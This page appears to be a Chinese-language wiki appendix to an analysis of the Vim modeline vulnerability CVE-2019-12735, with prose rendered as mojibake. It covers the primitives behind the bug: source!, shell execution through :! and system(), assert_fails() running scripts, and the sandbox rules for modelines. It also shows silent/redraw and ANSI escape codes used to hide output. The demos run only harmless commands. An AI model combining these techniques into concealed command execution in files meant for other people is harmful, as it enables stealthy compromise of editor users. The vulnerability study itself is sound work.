<!DOCTYPE html>
<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  
  <link rel="shortcut icon" href="../../img/favicon.ico">
  <title>Cve 2019 12735 é™„ä»¶ - expwiki</title>
  <link href='https://fonts.googleapis.com/css?family=Lato:400,700|Roboto+Slab:400,700|Inconsolata:400,700' rel='stylesheet' type='text/css'>

  <link rel="stylesheet" href="../../css/theme.css" type="text/css" />
  <link rel="stylesheet" href="../../css/theme_extra.css" type="text/css" />
  <link rel="stylesheet" href="../../css/highlight.css">
  
  <script>
    // Current page data
    var mkdocs_page_name = "Cve 2019 12735 \u9644\u4ef6";
    var mkdocs_page_input_path = "userspace/cve-2019-12735-\u9644\u4ef6.md";
    var mkdocs_page_url = "/userspace/cve-2019-12735-\u9644\u4ef6/";
  </script>
  
  <script src="../../js/jquery-2.1.1.min.js"></script>
  <script src="../../js/modernizr-2.8.3.min.js"></script>
  <script type="text/javascript" src="../../js/highlight.pack.js"></script> 
  
</head>

<body class="wy-body-for-nav" role="document">

  <div class="wy-grid-for-nav">

    
    <nav data-toggle="wy-nav-shift" class="wy-nav-side stickynav">
      <div class="wy-side-nav-search">
        <a href="../.." class="icon icon-home"> expwiki</a>
        <div role="search">
  <form id ="rtd-search-form" class="wy-form" action="../../search.html" method="get">
    <input type="text" name="q" placeholder="Search docs" />
  </form>
</div>
      </div>

      <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
	<ul class="current">
	  
          
            <li class="toctree-l1">
		
    <a class="" href="../..">Home</a>
	    </li>
          
            <li class="toctree-l1">
		
    <a class="" href="../../acknowledgements/">Acknowledgements</a>
	    </li>
          
            <li class="toctree-l1">
		
    <span class="caption-text">Kernel</span>
    <ul class="subnav">
                <li class="">
                    
    <a class="" href="../../kernel/cve-2018-18281-åˆ†æ/">Cve 2018 18281 åˆ†æ</a>
                </li>
                <li class="">
                    
    <a class="" href="../../kernel/cve-2018-18281-é™„ä»¶/">Cve 2018 18281 é™„ä»¶</a>
                </li>
                <li class="">
                    
    <a class="" href="../../kernel/cve-2019-13272-åˆ†æ/">Cve 2019 13272 åˆ†æ</a>
                </li>
                <li class="">
                    
    <a class="" href="../../kernel/cve-2019-13272-é™„ä»¶/">Cve 2019 13272 é™„ä»¶</a>
                </li>
    </ul>
	    </li>
          
            <li class="toctree-l1">
		
    <span class="caption-text">Userspace</span>
    <ul class="subnav">
                <li class="">
                    
    <a class="" href="../cve-2018-1000001-åˆ†æ/">Cve 2018 1000001 åˆ†æ</a>
                </li>
                <li class="">
                    
    <a class="" href="../cve-2018-1000001-é™„ä»¶/">Cve 2018 1000001 é™„ä»¶</a>
                </li>
                <li class="">
                    
    <a class="" href="../cve-2019-12735-åˆ†æ/">Cve 2019 12735 åˆ†æ</a>
                </li>
                <li class=" current">
                    
    <a class="current" href="./">Cve 2019 12735 é™„ä»¶</a>
    <ul class="subnav">
            
    <li class="toctree-l3"><a href="#vimcve-2019-12735">Vimæ¼æ´åˆ†æé™„ä»¶(cve-2019-12735)</a></li>
    
        <ul>
        
            <li><a class="toctree-l4" href="#_1">èƒŒæ™¯çŸ¥è¯†</a></li>
        
            <li><a class="toctree-l4" href="#exp">expä¿®æ”¹è¯´æ˜</a></li>
        
            <li><a class="toctree-l4" href="#vim_2">Vimå®‰è£…</a></li>
        
            <li><a class="toctree-l4" href="#_3">æ¼æ´é˜²æŠ¤</a></li>
        
        </ul>
    

    </ul>
                </li>
                <li class="">
                    
    <a class="" href="../cve-2019-5736-åˆ†æ/">Cve 2019 5736 åˆ†æ</a>
                </li>
                <li class="">
                    
    <a class="" href="../cve-2019-5736-é™„ä»¶/">Cve 2019 5736 é™„ä»¶</a>
                </li>
    </ul>
	    </li>
          
        </ul>
      </div>
      &nbsp;
    </nav>

    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">

      
      <nav class="wy-nav-top" role="navigation" aria-label="top navigation">
        <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
        <a href="../..">expwiki</a>
      </nav>

      
      <div class="wy-nav-content">
        <div class="rst-content">
          <div role="navigation" aria-label="breadcrumbs navigation">
  <ul class="wy-breadcrumbs">
    <li><a href="../..">Docs</a> &raquo;</li>
    
      
        
          <li>Userspace &raquo;</li>
        
      
    
    <li>Cve 2019 12735 é™„ä»¶</li>
    <li class="wy-breadcrumbs-aside">
      
    </li>
  </ul>
  <hr/>
</div>
          <div role="main">
            <div class="section">
              
                <h1 id="vimcve-2019-12735">Vimæ¼æ´åˆ†æé™„ä»¶(cve-2019-12735)</h1>
<h3 id="_1">èƒŒæ™¯çŸ¥è¯†</h3>
<h4 id="vim">Vimçš„æ¨¡å¼</h4>
<p><a href="http://vimdoc.sourceforge.net/htmldoc/intro.html#vim-modes-intro">å‚è€ƒï¼šhttp://vimdoc.sourceforge.net/htmldoc/intro.html#vim-modes-intro</a>  </p>
<p><strong>Normal mode</strong></p>
<p>é€šè¿‡ $ vim file æ‰“å¼€æ–‡ä»¶åè¿›å…¥çš„æ¨¡å¼</p>
<pre><code class="shell">$ vim hello.txt
Hello
~                                                                     
~                                                                      
~                                                                      ...
~                                                                               
&quot;hello.txt&quot; 1L, 6C

</code></pre>

<p>é€šè¿‡source!åŠ è½½çš„è„šæœ¬çš„å†…å®¹ï¼Œå°±æ˜¯ç›¸å½“äºåœ¨è¿™ä¸ªæ¨¡å¼ä¸‹è¾“å…¥çš„å†…å®¹</p>
<p><strong>Command-line mode</strong></p>
<ul>
<li>
<p>åœ¨normal modeä¸‹è¾“å…¥<code>: ( and / ? )</code>è¿›å…¥Command-line mode</p>
</li>
<li>
<p>åœ¨Vimçš„Command-lineæ¨¡å¼ä¸‹ï¼Œå¯ä»¥æ‰§è¡ŒVim commands</p>
</li>
<li>å…¶ä¸­ï¼Œé€šè¿‡ <code>:!{shell cmd}</code> å¯ä»¥æ‰§è¡Œshellå‘½ä»¤</li>
</ul>
<pre><code class="shell"># http://vimdoc.sourceforge.net/htmldoc/various.html#:!
$ vim
:!uname -a

Linux ubuntu 4.4.0-112-generic #135-Ubuntu SMP Fri Jan 19 11:48:36 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux

Press ENTER or type command to continue

</code></pre>

<p><strong>Ex mode</strong></p>
<ul>
<li>
<p>é€šè¿‡<code>$ vim -e  file</code>è¿›å…¥è¯¥æ¨¡å¼</p>
</li>
<li>
<p>ä¹Ÿå¯ä»¥åœ¨Normal modeä¸‹è¾“å…¥Qè¿›å…¥è¯¥æ¨¡å¼</p>
</li>
<li>è¿™ä¸ªæ¨¡å¼çš„ç‰¹ç‚¹æ˜¯å¯ä»¥è¿ç»­æ‰§è¡ŒVim commandï¼Œå¯ä»¥ç±»æ¯” python çš„å‘½ä»¤è¡Œæ¨¡å¼</li>
<li>é€šè¿‡sourceåŠ è½½çš„è„šæœ¬çš„å†…å®¹ï¼Œå°±æ˜¯ç›¸å½“äºåœ¨è¿™ä¸ªæ¨¡å¼ä¸‹è¾“å…¥çš„å†…å®¹</li>
</ul>
<p><strong>Insert mode</strong></p>
<ul>
<li>
<p>åœ¨Normal modeä¸‹è¾“å…¥iå¯ä»¥è¿›å…¥Insert mode, è¿™ä¸ªæ¨¡å¼ç›¸å½“äºç¼–è¾‘æ¨¡å¼ï¼Œå¤§éƒ¨åˆ†æ“ä½œå’Œåœ¨è®°äº‹æœ¬ä¸­ä¸€æ ·ã€‚</p>
</li>
<li>
<p>å¦å¤–è¿˜æœ‰ "I", "a", "A", "o", "O", "c", "C", "s" or S"ä¹Ÿå¯ä»¥ä»Normal modeè¿›å…¥Insert mode.</p>
</li>
<li>
<p>å…·ä½“æ¨¡å¼è½¬æ¢è§: <a href="http://vimdoc.sourceforge.net/htmldoc/intro.html#vim-modes-intro">http://vimdoc.sourceforge.net/htmldoc/intro.html#vim-modes-intro</a></p>
</li>
<li>
<p>å…¶ä¸­"S"è¡¨ç¤ºå‰ªåˆ‡å½“å‰è¡Œï¼Œå¹¶è¿›å…¥Insert mode</p>
</li>
</ul>
<pre><code class="shell"># :help S
# [&quot;x]S                   Delete [count] lines [into register x] and start
#                           insert.  Synonym for &quot;cc&quot; |linewise|.

# Demoæ¼”ç¤º
$ vim 1.vim
:let i = 1
:while i &lt; 10
:    let a = getline(i)
:    if empty(a)
:        break
:    endif
:    echo &quot;Line:&quot; i &quot;is&quot;  a
:    let i += 1
:endwhile
~                                                                      
...     
~                                                                               
&quot;1.vim&quot; 9L, 147C

S(shift+s)


:while i &lt; 10
:    let a = getline(i)
:    if empty(a)
:        break
:    endif
:    echo &quot;Line:&quot; i &quot;is&quot;  a
:    let i += 1
:endwhile
~                                                                      ...
~

-- INSERT --
&lt;ESC&gt;
p  (pæ˜¯ç²˜è´´)
p


:let i = 1
:let i = 1
:while i &lt; 10
:    let a = getline(i)
:    if empty(a)
:        break
:    endif
:    echo &quot;Line:&quot; i &quot;is&quot;  a
:    let i += 1
:endwhile
~                                                                      ...


</code></pre>

<h4 id="vim-options">Vim optionsçš„æ¦‚å¿µ</h4>
<p>Vimçš„optionsç›¸å½“äºç¼–è¾‘å™¨çš„é…ç½®ï¼Œé€šè¿‡command-lineæ¨¡å¼çš„:setå‘½ä»¤æ‰‹åŠ¨é…ç½®ï¼Œä¹Ÿå¯ä»¥é€šè¿‡è„šæœ¬è‡ªåŠ¨é…ç½®ï¼Œè‡ªåŠ¨é…ç½®çš„æ–¹æ³•ä¸»è¦æ˜¯é€šè¿‡Vimè„šæœ¬(.vimrc, .exrc)æˆ–è€…modelineæ–¹å¼ã€‚</p>
<h4 id="vimmodeline">Vimçš„modelineåŠŸèƒ½</h4>
<ul>
<li>
<p>å‚è€ƒ1: <a href="http://vimdoc.sourceforge.net/htmldoc/options.html#modeline">http://vimdoc.sourceforge.net/htmldoc/options.html#modeline</a></p>
</li>
<li>
<p>å‚è€ƒ2: <a href="http://vimdoc.sourceforge.net/htmldoc/options.html#modeline">https://vim.fandom.com/wiki/Modeline_magic</a></p>
</li>
</ul>
<p>modelineç”¨äºåœ¨æ–‡æœ¬æ–‡ä»¶çš„é¦–éƒ¨æˆ–è€…å°¾éƒ¨è®¾ç½®vim options, è®©vimæ‰“å¼€æ–‡ä»¶çš„æ—¶å€™è‡ªåŠ¨åŠ è½½å¹¶æ‰§è¡Œè¯¥é…ç½®</p>
<pre><code class="shell">
# modeline æœ‰ä¸¤ç§æ ¼å¼
# ç¬¬ä¸€ç§æ ¼å¼ï¼š [text]{white}{vi:|vim:|ex:}[white]{options}
#                           vi:noai:sw=3 ts=6 
# - textå¯ä»¥ç”¨æ¥æ”¾ç½®ç¼–ç¨‹è¯­è¨€çš„æ³¨é‡Š(pythonçš„ # , C çš„// )ï¼Œæ˜¯å¯é€‰çš„
# - vi:ä¹‹å‰ä¸€å®šè¦æœ‰ç©ºæ ¼
# - optionsç”¨&quot;:&quot;æˆ–è€…ç©ºæ ¼åˆ†éš”


# ç¬¬äºŒç§æ ¼å¼ï¼š    
#  [text]{white}{vi:|vim:|ex:}[white]se[t] {options}:[text]
#               /* vim: set ai tw=75: */ 
# - é¦–å°¾éƒ½å¯ä»¥ç”¨textä¸»è¦æ˜¯æ”¯æŒ(Cçš„è¿™ç§æ³¨é‡Š &quot;/**/&quot;)ï¼Œé¦–å°¾çš„textéƒ½æ˜¯å¯é€‰çš„
# - vim: åé¢è¦æœ‰ç©ºæ ¼
# - è¦æœ‰ä¸€ä¸ªset(å¯ä»¥ç¼©å†™æˆ seï¼Œåé¢è·Ÿç©ºæ ¼)
# - optionsç”¨ç©ºæ ¼åˆ†éš”
# - ç»“å°¾è¦æœ‰å†’å· : 

</code></pre>

<p>å¼€å¯modeline</p>
<pre><code class="shell"># ç¼–è¾‘~/.vimrc
# æ·»åŠ ï¼š
set modeline
set modelines=5

</code></pre>

<p>å…·ä½“ä½¿ç”¨</p>
<pre><code class="shell"># ç”¨Vimæ‰“å¼€æ–‡æœ¬ï¼š
$ vim a.py
# python3
# coding=utf-8
import platform

def func1():
        for i in range(10):
                print(&quot;hello vim&quot;)
                print(platform.platform())
# cursor is here 

def main():
        func1()

main()


# æ‰“å¼€a.pyå, é»˜è®¤çš„tabé•¿åº¦æ˜¯8ä¸ªç©ºæ ¼ï¼Œä¸æ”¯æŒå›è½¦è‡ªåŠ¨ç¼©è¿›
# å¯ä»¥é€šè¿‡tabstopå’Œautoindentä¸¤ä¸ªé€‰é¡¹æ¥é…ç½®
:set tabstop=4
:set autoindent


# æ•ˆæœå¦‚ä¸‹ï¼š
# python3
# coding=utf-8
import platform

def func1():
    for i in range(10):
        print(&quot;hello vim&quot;)
        print(platform.platform())
        # cursor is here

def main():
    func1()

main()


# ä½†æ˜¯ä¸‹æ¬¡æ‰“å¼€åï¼Œåˆéœ€è¦å†é…ç½®ä¸€æ¬¡
# å¯ä»¥é€šè¿‡modelineæ¥ä½¿è¿™ä¸ªé…ç½®æ¯æ¬¡æ‰“å¼€a.pyæ–‡ä»¶æ—¶éƒ½ç”Ÿæ•ˆ
# åœ¨æ–‡ä»¶å¼€å¤´æ·»åŠ ä¸€è¡Œå†…å®¹ï¼š # vim: set tabstop=4 autoindent: 
# å†æ¬¡æ‰“å¼€æ•ˆæœå¦‚ä¸‹ï¼š

$ vim a.py
# vim: set tabstop=4 autoindent: 
# python3
# coding=utf-8
import platform


def func1():
    for i in range(10):
        print(&quot;hello vim&quot;)
        print(platform.platform())
        # cursor is here

def main():
    func1()

main()



</code></pre>

<p><code>For security reasons, only a subset of options is permitted in modelines, and if the option value contains an expression, it is executed in a sandbox</code><br />
ä¸ºäº†å®‰å…¨åŸå› ï¼Œåªæœ‰éƒ¨åˆ†optionså¯ä»¥åœ¨modelineä¸­é…ç½®ï¼Œå¦‚æœoptionçš„å€¼æ˜¯ä¸€ä¸ªè¡¨è¾¾å¼(æ¯”å¦‚é…ç½®foldexpr)ï¼Œé‚£ä¹ˆè¡¨è¾¾å¼ä¼šåœ¨vimçš„sandboxä¸­æ‰§è¡Œ</p>
<h4 id="vim_1">Vimè¡¨è¾¾å¼å’Œè„šæœ¬</h4>
<p>æ ¹æ®Vim Scriptè¯­æ³•ç¼–å†™Vimè„šæœ¬ï¼Œå‚è€ƒï¼š</p>
<p><a href="https://github.com/name5566/vim-config/blob/master/vim_script.md">https://github.com/name5566/vim-config/blob/master/vim_script.md</a>
<a href="http://vimdoc.sourceforge.net/htmldoc/usr_41.html">http://vimdoc.sourceforge.net/htmldoc/usr_41.html</a>
<a href="http://vimdoc.sourceforge.net/htmldoc/eval.html">http://vimdoc.sourceforge.net/htmldoc/eval.html</a>
<a href="http://vimdoc.sourceforge.net/htmldoc/eval.html">http://vimdoc.sourceforge.net/htmldoc/eval.html#functions</a></p>
<pre><code class="shell"># åˆ›å»ºä¸€ä¸ªVimè„šæœ¬1.vim
$ vim 1.vim


# æŒ‰ç…§Vim Scriptè¯­æ³•ç¼–è¾‘è„šæœ¬
:let i = 1
:while i &lt; 10
:    let a = getline(i)
:    if empty(a) 
:        break
:    endif
:    echo &quot;Line:&quot; i &quot;is&quot;  a
:    let i += 1
:endwhile


# ä¿å­˜
:w


# ç”¨sourceæŒ‡ä»¤åŠ è½½è‡ªå·±å¹¶æ‰§è¡Œ
:source % 
# or
:source 1.vim


# æ‰§è¡Œç»“æœï¼š
Line: 1 is :let i = 1
Line: 2 is :while i &lt; 10
Line: 3 is :    let a = getline(i)
Line: 4 is :    if empty(a)
Line: 5 is :        break
Line: 6 is :    endif
Line: 7 is :    echo &quot;Line:&quot; i &quot;is&quot;  a
Line: 8 is :    let i += 1
Line: 9 is :endwhile
Press ENTER or type command to continue



# åœ¨ç¼–è¾‘å…¶ä»–æ–‡ä»¶çš„æ—¶å€™åŠ è½½å¹¶æ‰§è¡Œä¸€ä¸ªVimè„šæœ¬
$ vim a.txt
Hello
Vim
Goodbye!
~         
:source 1.vim


Line: 1 is Hello
Line: 2 is Vim
Line: 3 is Goodbye!
Press ENTER or type command to continue


</code></pre>

<h4 id="source">sourceå‘½ä»¤</h4>
<p>sourceå‘½ä»¤ç”¨äºä»Vimè„šæœ¬æ–‡ä»¶ä¸­è¯»å–VimæŒ‡ä»¤å¹¶æ‰§è¡Œï¼Œå‚è€ƒï¼š<a href="http://vimdoc.sourceforge.net/htmldoc/repeat.html#using-scripts">http://vimdoc.sourceforge.net/htmldoc/repeat.html#using-scripts</a></p>
<pre><code class="shell">:help source

:so[urce] {file}        
  Read Ex commands from {file}.  
  These are commands that start with a &quot;:&quot;.


:so[urce]! {file}       
  Read Vim commands from {file}.  
  These are commands that are executed from Normal mode, 
  like you type them.


</code></pre>

<p>sourceå’Œsource!çš„åŒºåˆ«åœ¨äºï¼š</p>
<ul>
<li>sourceæ˜¯ä»æ–‡ä»¶è¯»å– Ex commands, ä¹Ÿå°±æ˜¯è¯´æ–‡ä»¶çš„å†…å®¹å¿…é¡»æ˜¯ :cmd çš„å½¢å¼</li>
<li>source!æ˜¯ä»æ–‡ä»¶è¯»å– Normal modeä¸‹æ‰§è¡Œçš„vim commands, ä¹Ÿå°±æ˜¯è¯´æ–‡ä»¶ä¸­çš„<code>&lt;ESC&gt; i /</code> å­—ç¬¦è¿™äº›éƒ½ä¼šå½“æˆNormal modeä¸‹çš„ç”¨æˆ·è¾“å…¥(like you type them)</li>
</ul>
<pre><code class="shell"># åˆ›å»ºä¸€ä¸ªvimè„šæœ¬ï¼Œå†™å…¥å†…å®¹iHello,Worldåä¿å­˜
$ vim 5.vim
iHello,World

:wq

# ç”¨source! åŠ è½½å¹¶æ‰§è¡Œè„šæœ¬
$ vim 
:source! 5.vim

# æ•ˆæœå¦‚ä¸‹ï¼Œæ‰“å¼€åç›´æ¥è¿›å…¥äº†Insert mode
Hello,World

~                                                                      
~                                                                      
...                                                                    
~                                                                       
~                                                                                                        
-- INSERT --


# è€Œç”¨sourceåŠ è½½åˆ™ä¼šæŠ¥é”™
$ vim 
:source 5.vim


Error detected while processing 5.vim:
line    1:
E492: Not an editor command: iHello,World
Press ENTER or type command to continue


</code></pre>

<h4 id="vimshell">vimæ‰§è¡Œshellå‘½ä»¤</h4>
<p>é€šè¿‡åœ¨command-line modeä¸‹ï¼Œä½¿ç”¨ !{cmd}æ¥æ‰§è¡Œshellå‘½ä»¤</p>
<pre><code class="shell">$ vim
:!uname -a

Linux ubuntu 4.4.0-112-generic #135-Ubuntu SMP Fri Jan 19 11:48:36 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux

Press ENTER or type command to continue


</code></pre>

<pre><code class="shell"># ä¸€ä¸ªå¯ä»¥æ‰§è¡Œshellå‘½ä»¤çš„vimè„šæœ¬
$ vim a.vim
&lt;i&gt;
:!uname -a
~
~
&lt;ESC&gt;
:source %

... Darwin Kernel Version 18.2.0: Thu Dec 20 20:46:53 PST 2018; root:xnu-4903.241.1~1/RELEASE_X86_64 x86_64

Press ENTER or type command to continue

# ç‰¹æ®Šçš„å‡½æ•°execute
# $ vim
# :help execute()
#  execute({command} [, {silent}])                                 *execute()*
#                 Execute an Ex command or commands and return the output as a
#                 string. 
#                 {command} can be a string or a List.  In case of a List the
#                 lines are executed one by one. 
# ...

#                 The optional {silent} argument can have these values:
#                         &quot;&quot;              no `:silent` used
#                         &quot;silent&quot;        `:silent` used
#                         &quot;silent!&quot;       `:silent!` used
#                               The default is &quot;silent&quot;.  
#                               Note that with &quot;silent!&quot;, unlike `:redir`, error messages are dropped
# ...


$ vim b.vim
: call execute(&quot;source a.vim&quot;, &quot;&quot;)


... Darwin Kernel Version 18.2.0: Thu Dec 20 20:46:53 PST 2018; root:xnu-4903.241.1~1/RELEASE_X86_64 x86_64


Press ENTER or type command to continue


# executeå‡½æ•°åœ¨ubuntuä¸Šå®‰è£…çš„Vimä¸­æ²¡æœ‰ï¼Œä½†æ˜¯è¿˜æœ‰å¦ä¸€ä¸ªå¯ä»¥æ‰§è¡Œshellå‘½ä»¤ï¼šassert_fails()
# $ vim
# :help assert_fails
# 
# assert_fails({cmd} [, {error}])                                 *assert_fails()*
#                 Run {cmd} and add an error message to |v:errors| if it does
#                 NOT produce an error.
#                 When {error} is given it must match in |v:errmsg|.
$ vim b.vim
: call assert_fails(&quot;source a.vim&quot;)


... Darwin Kernel Version 18.2.0: Thu Dec 20 20:46:53 PST 2018; root:xnu-4903.241.1~1/RELEASE_X86_64 x86_64


Press ENTER or type command to continue


</code></pre>

<h4 id="silent">silentå‘½ä»¤</h4>
<pre><code class="shell"># :help silent
#                              *:sil* *:silent* *:silent!*
# :sil[ent][!] {command}  
#    Execute {command} silently.  
#    Normal messages will not
#    be given or added to the message history.
#    When [!] is added, error messages will also be
#    skipped, and commands and mappings will not be aborted
#    when an error is detected.



# 1. ç¼–å†™ä¸€ä¸ªæ–‡ä»¶ï¼Œä¸ä½¿ç”¨silentï¼Œä¿å­˜åä¼šåœ¨åº•éƒ¨å‡ºç°å›æ˜¾ä¿¡æ¯
vim 1.txt
i
something 
~                                                                      ...     
~       
&lt;ESC&gt;
:w                                                                   
&quot;a.vim&quot; 1L, 11C written

# 2. ä½¿ç”¨silentï¼Œwå‘½ä»¤çš„å›æ˜¾ä¿¡æ¯å°±æ¶ˆå¤±äº†
vim 1.txt
i
somenthing
~                                                                       ...   
~                                                                               
:silent! w

# 3. silent! å¯ä»¥ç”¨æ¥å»é™¤é”™è¯¯ä¿¡æ¯
vim 1.txt
i
something
&lt;ESC&gt;
:w
:file | silent! Anycommand or anytext'\' \; &quot;

something
~                                                                      ...
~                                                                                                                                           
&quot;1.vim&quot; line 1 of 1 --100%-- col 9


</code></pre>

<h4 id="redraw">redrawå‘½ä»¤</h4>
<pre><code class="shell"># :help redraw!
#                                             *:redr*  *:redraw*
# :redr[aw][!]            
#  Redraw the screen right now.  
#  When ! is included it is cleared first.
#                         ... 
# ç«‹åˆ»åˆ·æ–°å±å¹•ï¼Œå¦‚æœè®¾ç½®äº†!åˆ™å…ˆæ¸…é™¤å±å¹•å†…å®¹
# æ¯æ¡å‘½äº†æ‰§è¡Œå®Œï¼Œåº•éƒ¨ä¼šç•™ä¸‹å†å²è®°å½•ï¼Œ redraw!ä¼šæ¸…é™¤æ‰è®°å½•

# å±å¹•ä¼šæ¸…ç©º
vim 1.txt
i
somenthing
~                                                                       ...   
~                                                                               
:silent! w
:redraw!

something
~                                                                       ...
~                                                                            

</code></pre>

<h4 id="file">fileå‘½ä»¤</h4>
<pre><code class="shell"># è¾“å…¥å½“å‰æ–‡ä»¶ä¿¡æ¯
vim 1.txt
i
something
&lt;ESC&gt;
:w
:file
something
~                                                                      ...
~                                                                                                                                           
&quot;1.vim&quot; line 1 of 1 --100%-- col 9



</code></pre>

<h4 id="system">systemå‡½æ•°</h4>
<pre><code class="shell">system({expr} [, {input}])                              *system()* *E677*
Get the output of the shell command {expr} as a string.  
... 

$ vim
:let a = system('pwd')
:echo a

~                                                                      
/home/invincible/Desktop/test/vim_test

Press ENTER or type command to continue


</code></pre>

<h4 id="assert_fails">assert_failså‡½æ•°</h4>
<p>æ‰§è¡Œä¸€ä¸ªvim command, å¦‚æœæ²¡æœ‰å‡ºé”™ï¼Œåˆ™å°†commandçš„æ‰§è¡Œä¿¡æ¯ä¿å­˜åˆ°v:errorså…¨å±€å˜é‡ä¸­</p>
<pre><code class="shell">:help assert_fails

assert_fails({cmd} [, {error}])                                
  Run {cmd} and add an error message to |v:errors| 
  if it does NOT produce an error.
  When {error} is given it must match in |v:errmsg|.

</code></pre>

<pre><code class="shell">$ vim
:call assert_fails(&quot;echo 'hello'&quot;)

~
...
~
hello

:echo v:errors
['command did not fail: echo ''hello''']

</code></pre>

<p>ç¼–å†™ä¸€ä¸ªå¯ä»¥æ‰§è¡Œshellå‘½ä»¤çš„vimè„šæœ¬</p>
<pre><code class="shell">
$ vim a.vim
&lt;i&gt;
:!uname -a
~
~
&lt;ESC&gt;
:wq

# ç”¨assert_faildæ‰§è¡Œvimçš„sourceæŒ‡ä»¤ï¼ŒåŠ è½½vimè„šæœ¬a.vim
$ vim
:call assert_fails(&quot;source a.vim&quot;)

Linux ubuntu 4.4.0-112-generic #135-Ubuntu SMP Fri Jan 19 11:48:36 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux

Press ENTER or type command to continue

:echo v:errormsg
['command did not fail: source a.vim']

</code></pre>

<h4 id="vimfolding">Vimçš„foldingåŠŸèƒ½</h4>
<ul>
<li>
<p>vimçš„foldingåŠŸèƒ½ç”¨äºå¯¹æ–‡æœ¬ä¸­çš„æ–‡æœ¬å—ï¼ˆæ¯”å¦‚ä¸€ä¸ªå‡½æ•°ï¼Œä¸€æ®µæ³¨é‡Šï¼‰æŠ˜å å’Œå±•å¼€ï¼Œå¯ä»¥ç±»æ¯”ä¸ºå›¾å½¢åŒ–ç¼–è¾‘å™¨ç¼–è¾‘åŒºä¾§æ çš„(+/-)ã€‚</p>
</li>
<li>
<p>foldmethodé€‰é¡¹æ˜¯ç”¨æ¥é…ç½®Vimçš„ä»£ç æŠ˜å åŠŸèƒ½çš„ï¼ŒVimç»™å‡ºäº†manual, indent, expr, syntax, diff, markerè¿™å‡ ç§ä»£ç æŠ˜å çš„æ–¹å¼ï¼Œä¸‹é¢ğŸ‘‡æ˜¯indentæ–¹å¼çš„æ•ˆæœï¼š</p>
</li>
</ul>
<pre><code class="shell"># æ–‡æœ¬å¦‚ä¸‹
$ vim a.py

# python3
# coding=utf-8
import platform

def func1():
        for i in range(10):
                print(&quot;hello vim&quot;)
                print(platform.platform())

def main():
        func1()

main()


# 1. è®¾ç½®foldmethodé€‰é¡¹
:set foldenable
:set foldmethod=indent

# æ•ˆæœå¦‚ä¸‹
# python3
# coding=utf-8
import platform

def func1():
+--  3 lines: for i in range(10):-------------------------------------

def main():
        func1()

main()


</code></pre>

<p>å¦‚æœä¸æ»¡è¶³äºç»™å®šçš„å‡ ç§æ–¹å¼ï¼Œå¯ä»¥å°†foldmethodè®¾ç½®ä¸ºexpræ¥è‡ªå®šä¹‰ä»£ç å—çš„ç‰¹å¾</p>
<pre><code class="shell"># æ–‡æœ¬å¦‚ä¸‹
$ vim a.py

# python3
# coding=utf-8
import platform

def func1():
        for i in range(10):
                print(&quot;hello vim&quot;)
                print(platform.platform())

def main():
        func1()


main()

:set foldenable
:set foldmethod=expr
:set foldexpr=getline(v:lnum)[0]==\&quot;#\&quot;
# foldexprç”¨äºè®¾ç½®æ–‡æœ¬æ»¡è¶³çš„æ¡ä»¶ï¼Œæ»¡è¶³æ¡ä»¶çš„æ–‡æœ¬å—ä¼šè¢«æŠ˜å 
# è¯¥é…ç½®çš„æ„æ€æ˜¯é€šè¿‡Vimçš„getlineå‡½æ•°ï¼Œåˆ¤æ–­æ¯ä¸€è¡Œæ–‡æœ¬çš„ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯å¦ä¸º&quot;#&quot;ï¼Œå°†æ»¡è¶³æ¡ä»¶çš„ç›¸é‚»çš„è¡Œè§†ä¸ºä¸€ä¸ªæ–‡æœ¬å—ï¼Œå¹¶å°†å…¶æŠ˜å 
# æ•ˆæœå¦‚ä¸‹: 

+--  2 lines: # python3-----------------------------------------------
import platform

def func1():
        for i in range(10):
                print(&quot;hello vim&quot;)
                print(platform.platform())

def main():
        func1()

main()



</code></pre>

<h4 id="vimsandbox">vimçš„sandboxæ¦‚å¿µ</h4>
<pre><code class="shell">11. The sandbox                 *eval-sandbox* *sandbox* *E48*


The 'foldexpr', 'formatexpr', 'includeexpr', 'indentexpr', 'statusline' and
'foldtext' options may be evaluated in a sandbox. 


This gives some safety for when these options are set from a modeline.  


These items are not allowed in the sandbox:
    - changing the buffer text
    - defining or changing mapping, autocommands, functions, user commands
    - setting certain options (see |option-summary|)
    - setting certain v: variables (see |v:var|)  *E794*
    - executing a shell command
    - reading or writing a file
    - jumping to another buffer or editing a file
    - executing Python, Perl, etc. commands


</code></pre>

<h4 id="ansi-escape-codes">ANSI escape codes</h4>
<p>å‚è€ƒï¼š</p>
<p><a href="https://www.gnu.org/software/screen/manual/html_node/Control-Sequences.html">https://www.gnu.org/software/screen/manual/html_node/Control-Sequences.html</a><br />
<a href="https://notes.burke.libbey.me/ansi-escape-codes/">https://notes.burke.libbey.me/ansi-escape-codes/</a><br />
<a href="https://learnku.com/articles/26231">https://learnku.com/articles/26231</a>  </p>
<h5 id="x1b1g">\x1b[1G</h5>
<p>\x1b[1G å…‰æ ‡ç§»åŠ¨åˆ°å½“å‰è¡Œçš„ç¬¬Pnä¸ªä½ç½®</p>
<pre><code class="shell"># ESC [ Pn G                      Cursor horizontal position
# $ echo -e &quot;Hello\x1b[1GA&quot; &gt; a.txt
# $ cat a.txt
# Aello
# $ echo -e &quot;Hello\x1b[2GA&quot; &gt; a.txt
# $ cat a.txt
# HAllo
# $ echo -e &quot;Hello\x1b[3GA&quot; &gt; a.txt
# $ cat a.txt
# HeAlo

</code></pre>

<h5 id="x1bd">\x1b[D</h5>
<p>\x1b[D å…‰æ ‡å·¦ç§»1ä¸ªä½ç½®</p>
<pre><code class="shell"># ESC [ Pn D                      Cursor Left
# å…‰æ ‡å·¦ç§»Pnä¸ªä½ç½®
# $ echo -e &quot;Hello\x1b[D&quot; &gt; a.txt
# $ cat a.txt
# Hello
# $ echo -e &quot;Hello\x1b[D\x1b[D\x1b[DAAA&quot; &gt; a.txt
# $ cat a.txt
# HeAAA
# $ echo -e &quot;Hello\x1b[5DAAA&quot; &gt; a.txt
# $ cat a.txt
# AAAlo

</code></pre>

